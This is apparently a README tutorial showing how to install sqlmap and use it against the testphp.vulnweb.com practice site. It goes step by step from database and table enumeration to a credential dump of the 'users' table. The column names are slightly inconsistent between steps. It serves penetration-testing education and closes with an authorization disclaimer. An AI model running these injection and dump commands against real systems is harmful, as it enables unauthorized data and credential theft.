# 🚀 SQLMap Installation and Usage Guide

## 1. 🔧 Installation of SQLMap

### 📷 Screenshot:
![Installation: ](screenshots/database_detection.png)


Run the following command to install SQLMap on your Linux system:

```bash
sudo apt update && sudo apt install sqlmap -y
```

---

## 2. 🛡️ Database Detection

### 📷 Screenshot:
![Database Detection](screenshots/database_detection.png)


To detect databases on a vulnerable website, use the command:

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
```

### ⚙️ Explanation:
- `-u "http://testphp.vulnweb.com/listproducts.php?cat=1"`: Specifies the URL to test. The `cat=1` is a potential SQL injection point.
- `--dbs`: Lists all available databases on the target if it is vulnerable to SQL injection.


### 📷 Screenshot:
![Database Detection Output](screenshots/database_detection.png)

### ✅ Output:
```
Databases:
- acuart
- information_schema
```
---

## 3. 📊 Tables Detection

### 📷 Screenshot:
![Tables Detection](screenshots/tables_detection.png)

To list tables within the discovered `acuart` database, run:

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
```

### ⚙️ Explanation:
- `-D acuart`: Specifies the target database.
- `--tables`: Lists all tables within the `acuart` database.

### 📷 Screenshot:
![Tables Detection Output](screenshots/tables_detection.png)

### ✅ Output:
```
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| products  |
| pictures  |
| users     |
+-----------+
```



---

## 4. 📑 Columns Detection

### 📷 Screenshot:
![Columns Detection](screenshots/columns_detection.png)

To enumerate columns within the `users` table:

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns
```

### ⚙️ Explanation:
- `-D acuart`: Specifies the target database.
- `-T users`: Specifies the target table.
- `--columns`: Lists columns in the `users` table.

### 📷 Screenshot:
![Columns Detection](screenshots/columns_detection.png)

### ✅ Output:
```
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| name    | varchar(100) |
| address | mediumtext   |
| email   | varchar(100) |
| pass    | varchar(100) |
+---------+--------------+
```

---

## 5. 🔑 Collecting Credentials

### 📷 Screenshot:
![Credentials Collection](screenshots/credentials_collection.png)

To dump specific columns like `uname` and `pass` from the `users` table:

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C uname,pass --dump
```

### ⚙️ Explanation:
- `-T users`: Target table.
- `-C uname,pass`: Columns to dump.
- `--dump`: Extract and display data.

### 📷 Screenshot:
![Credentials Collection Output](screenshots/credentials_collection.png)

### ✅ Sample Output:
```
+-------+------+
| uname | pass |
+-------+------+
| test  | test |
+-------+------+
```



---

## ⚠️ Disclaimer

> Unauthorized testing or exploiting websites without explicit permission is illegal and unethical. Always ensure you have proper authorization before using SQLMap or similar tools.


